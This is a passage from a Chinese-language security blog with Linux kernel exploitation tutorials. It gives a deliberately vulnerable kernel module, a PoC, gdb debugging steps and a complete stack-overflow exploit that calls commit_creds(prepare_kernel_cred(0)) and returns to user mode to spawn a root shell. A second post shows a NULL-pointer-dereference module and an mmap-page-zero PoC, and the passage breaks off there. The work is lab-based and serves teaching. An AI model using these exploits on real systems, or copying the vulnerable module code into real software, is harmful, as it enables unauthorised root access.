class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译后放到busybox里，新建用户测试exploit：<br><img src="/images/csaw2010/getroot.png"><br>成功获取root shell！<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3706.html">http://bobao.360.cn/learning/detail/3706.html</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/wbd880419/article/details/6637102">http://blog.csdn.net/wbd880419/article/details/6637102</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/20/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%89%EF%BC%89Kernel-Stack-Buffer-Overflow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/20/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%89%EF%BC%89Kernel-Stack-Buffer-Overflow/" class="post-title-link" itemprop="url">Linux内核漏洞利用（三）Kernel Stack Buffer Overflow</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-20 11:17:39" itemprop="dateCreated datePublished" datetime="2017-04-20T11:17:39+08:00">2017-04-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>内核栈溢出和用户态栈溢出原理一样，拷贝、拼接字符串的时候未作边界检查，导致溢出数据覆盖栈上保存的返回地址，从而劫持程序控制流。在内核空间可以用来提权。<br><strong>漏洞代码</strong> stack_smashing.c  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bug2_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> localbuf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(localbuf, buf, len);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">stack_smashing_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;stack_smashing driver init!\n&quot;</span>);</span><br><span class="line">    create_proc_entry(<span class="string">&quot;bug2&quot;</span>, <span class="number">0666</span>, <span class="number">0</span>)-&gt;write_proc = bug2_write;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">stack_smashing_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;stack_smashing driver exit!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(stack_smashing_init);</span><br><span class="line">module_exit(stack_smashing_exit);</span><br></pre></td></tr></table></figure>
<p><strong>Makefile</strong>  </p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj-m := stack_smashing.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /home/fanrong/Computer/linux-kernel/linux-2.6.32/</span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
<p><strong>PoC</strong> poc.c  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">24</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">24</span>);</span><br><span class="line">    *((<span class="keyword">void</span> **)(buf + <span class="number">20</span>)) = <span class="number">0x42424242</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug2&quot;</span>, O_WRONLY);</span><br><span class="line">    write(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload很简单，就是buffer+eip的结构。按照上一篇文章中的编译方法，编译上面的两份代码，构建busybox文件系统，qemu启动内核，加载模块，运行poc：<br><img src="/images/linuxkernel/stackpoc.png"><br>如果poc执行造成Kernel panic，而没有将EIP覆盖为0x42424242，可能是编译Kernel时默认开启了canary，需要关闭canary选项：编辑.config文件，注释掉CONFIG_CC_STACKPROTECTOR这一行，然后重新编译内核，再次运行PoC，这时发现EIP已经被覆盖成0x42424242。</p>
<blockquote>
<p>调试注意事项：模块在加载进内核后，并没有作为vmlinux的一部分传给gdb，因此必须通过某种方法把模块信息传给gdb。<code>add-symbol-file</code>命令就是用来把模块的详细信息传给gdb的。由于模块也是一个ELF文件，需要知道模块的.text、.bss、.data节区地址。模块stack_smashing.ko的这三个信息分别保存在/sys/module/stack_smashing/sections/.text、/sys/module/stack_smashing/sections/.bss和/sys/module/stack_smashing/sections/.data，由于stack_smashing模块没有bss、data节区，所以只需指定text即可。</p>
</blockquote>
<p><strong>调试过程</strong><br>在qemu中加载模块，设置好gdbserver后，找到模块的.text段的地址：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># grep 0 &#x2F;sys&#x2F;module&#x2F;stack_smashing&#x2F;sections&#x2F;.text</span><br><span class="line">0xd883a000</span><br></pre></td></tr></table></figure>
<p>在主机的linux-2.6.32目录中用gdb连接：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ gdb vmlinux</span><br><span class="line">gdb-peda$ target remote :1234</span><br><span class="line">Warning: not running or target is remote</span><br><span class="line">default_idle () at arch&#x2F;x86&#x2F;kernel&#x2F;process.c:311</span><br><span class="line">311            current_thread_info()-&gt;status |&#x3D; TS_POLLING;</span><br><span class="line">gdb-peda$ add-symbol-file ..&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.ko 0xd883a000</span><br><span class="line">add symbol table from file &quot;..&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.ko&quot; at</span><br><span class="line">    .text_addr &#x3D; 0xd883a000</span><br><span class="line">gdb-peda$ b bug2_write</span><br><span class="line">Breakpoint 1 at 0xd883a000: file &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;linux-kernel&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.c, line 7.</span><br><span class="line">gdb-peda$ c</span><br></pre></td></tr></table></figure>
<p>qemu中运行poc之后，主机gdb命中断点：<br><img src="/images/linuxkernel/debugpoc.png"><br>可以看到如果继续执行，程序就会返回到预期的值0x42424242。<br><strong>exploit</strong><br>思路：还是利用commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，执行起shell，也就是先把当前进程权限提到root，然后获取一个root的shell。<br>返回到用户模式要执行<code>IRET</code>指令。关于IRET指令：<br>当使用IRET指令返回到相同保护级别的任务时，IRET会从栈将<code>返回指令指针</code>、<code>返回代码段选择器</code>以及<code>EFLAGS映像</code>分别弹入EIP、CS以及EFLAGS寄存器，然后恢复执行中断的程序或过程。<br>当使用IRET指令返回到不同保护级别时，IRET不仅会从栈弹出以上内容，还会弹出<code>栈指针</code>以及<code>SS</code>。<br>栈上保存了trap frame，返回到用户模式的时候，恢复信息从以下结构中读取：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;       <span class="comment">// instruction pointer +0</span></span><br><span class="line">    <span class="keyword">uint32_t</span> cs;     <span class="comment">// code segment +4</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eflags; <span class="comment">// CPU flags +8</span></span><br><span class="line">    <span class="keyword">void</span> *esp;       <span class="comment">// stack pointer +12</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ss;     <span class="comment">// stack segment +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<p>在qemu中获得两个函数的地址：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># grep prepare_kernel_cred &#x2F;proc&#x2F;kallsyms</span><br><span class="line">c1057120 T prepare_kernel_cred</span><br><span class="line"># grep commit_creds &#x2F;proc&#x2F;kallsyms</span><br><span class="line">c1056f80 T commit_creds</span><br><span class="line">c11a6b60 T security_commit_creds</span><br></pre></td></tr></table></figure>
<p>exploit代码如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;pushl %cs; popl tf+4;&quot;</span> <span class="comment">// set cs</span></span><br><span class="line">        <span class="string">&quot;pushfl; popl tf+8;&quot;</span> <span class="comment">// set eflags</span></span><br><span class="line">        <span class="string">&quot;pushl %esp; popl tf+12;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushl %ss; popl tf+16;&quot;</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span> *(*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *) <span class="number">0xc1057120</span>;</span><br><span class="line"><span class="keyword">void</span> *(*commit_creds)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *) <span class="number">0xc1056f80</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov $tf, %esp;&quot;</span></span><br><span class="line">        <span class="string">&quot;iret;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">24</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">24</span>);</span><br><span class="line">    *((<span class="keyword">void</span> **)(buf+<span class="number">20</span>)) = &amp;payload; <span class="comment">// set eip to payload</span></span><br><span class="line">    init_tf_work();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug2&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="comment">// exploit</span></span><br><span class="line">    write(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试exploit需要先做一些准备工作：<br>1.确定模块代码节地址  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep 0 &#x2F;sys&#x2F;module&#x2F;stack_smashing&#x2F;sections&#x2F;.text</span><br><span class="line">0xd883a000</span><br></pre></td></tr></table></figure>
<p>2.gdb设置<br>qemu上启动gdbserver，本地gdb连接  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ gdb vmlinux</span><br><span class="line">...</span><br><span class="line">gdb-peda$ target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">Warning: not running or target is remote</span><br><span class="line">default_idle () at arch&#x2F;x86&#x2F;kernel&#x2F;process.c:311</span><br><span class="line">311            current_thread_info()-&gt;status |&#x3D; TS_POLLING;</span><br><span class="line">gdb-peda$ add-symbol-file ..&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.ko 0xd883a000</span><br><span class="line">add symbol table from file &quot;..&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.ko&quot; at</span><br><span class="line">    .text_addr &#x3D; 0xd883a000</span><br><span class="line">gdb-peda$ b bug2_write</span><br><span class="line">Breakpoint 3 at 0xd883a000: file &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;linux-kernel&#x2F;exploit&#x2F;stacksmashing&#x2F;stack_smashing.c, line 7.</span><br><span class="line">gdb-peda$ c</span><br></pre></td></tr></table></figure>
<p>在qemu中运行exploit，对模块进行调试：<br><img src="/images/linuxkernel/debugmodule.png"><br>可以看到漏洞代码执行到ret后，继续执行会返回到我们构造的payload中：<br><img src="/images/linuxkernel/debugexploit.png"><br>这里可以看到先执行了commit_creds(prepare_kernel_cred(0))。执行到iret时，栈顶就是我们伪造的tf结构了。eip会指向get_shell函数，因此整个exploit顺利执行。<br>下面我们添加用户，然后测试exploit：<br><img src="/images/linuxkernel/getroot.png"><br>成功获取root！<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3702.html">http://bobao.360.cn/learning/detail/3702.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/19/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89NULL-Pointer-Dereference/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/19/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89NULL-Pointer-Dereference/" class="post-title-link" itemprop="url">Linux内核漏洞利用（二）NULL Pointer Dereference</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-19 14:23:33" itemprop="dateCreated datePublished" datetime="2017-04-19T14:23:33+08:00">2017-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>漏洞比较久远，仅是作为Linux Kernel Exploit入门。<br><strong>漏洞代码</strong> null_dereference.c：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*my_funptr)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bug1_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    my_funptr();</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">null_dereference_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;null_dereference driver init!\n&quot;</span>);</span><br><span class="line">    create_proc_entry(<span class="string">&quot;bug1&quot;</span>, <span class="number">0666</span>, <span class="number">0</span>)-&gt;write_proc = bug1_write;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">null_dereference_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;null_dereference driver exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(null_dereference_init);</span><br><span class="line">module_exit(null_dereference_exit);</span><br></pre></td></tr></table></figure>
<p>可以看到漏洞代码中my_funptr函数指针是空指针（值为0x0），调用my_funptr可以执行0x0地址处的代码。<br>Makefile如下：  </p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">obj-m := null_dereference.o</span><br><span class="line">KERNELDR := /home/fanrong/Computer/linux-kernel/linux-2.6.32</span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">modules_install:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
<p>将漏洞代码在本地编译之后，将null_dereference.ko文件放到busybox-1.19.4/_install/usr/目录中。<br><strong>PoC</strong> poc.c  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">&quot;\xe9\xea\xbe\xad\x0b&quot;</span>; <span class="comment">// jmp 0xbadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug1&quot;</span>, O_WRONLY);</span><br><span class="line">    write(fd, <span class="string">&quot;fanrong&quot;</span>, <span class="number">7</span>); <span class="comment">// 调用bug1的write函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译：  </p>
